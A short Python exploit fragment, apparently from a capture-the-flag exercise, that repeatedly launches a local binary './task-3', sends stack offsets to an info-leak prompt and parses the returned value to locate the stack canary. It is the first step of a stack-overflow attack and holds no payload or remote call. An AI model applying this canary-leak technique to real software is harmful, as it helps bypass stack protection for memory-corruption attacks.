
def leak_at(off):
    io.recvuntil(b"Atlantic canary? ")
    io.sendline(str(off).encode())
    line = io.recvline_contains(b"Here's a hint:")
    # line looks like: b"Here's a hint: ffeeddcc00112200\n"
    hexval = line.strip().split(b":")[1].strip()
    return int(hexval, 16)


# Probe offsets that respect 8-byte alignment
for off in [16, 24, 32, 40, 48, 56]:
    # need a fresh connection each try (simplest) or adapt to single-session logic
    io = process("./task-3")
    val = leak_at(off)
    io.close()
    if (val & 0xff) == 0x00 and val != 0:
        print(f"Likely canary @ offset {off}: 0x{val:016x}")
        break
